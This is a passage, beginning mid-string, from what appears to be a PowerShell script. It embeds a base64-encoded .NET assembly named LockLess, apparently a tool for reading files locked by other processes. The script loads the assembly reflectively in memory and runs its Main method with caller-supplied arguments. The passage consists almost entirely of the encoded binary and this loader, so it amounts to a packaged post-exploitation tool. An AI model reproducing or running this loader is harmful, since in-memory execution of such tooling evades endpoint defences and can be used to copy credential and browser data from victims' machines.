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"
$Assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($Message))
[Lockless.Program]::Main($Command.Split(" "))
}
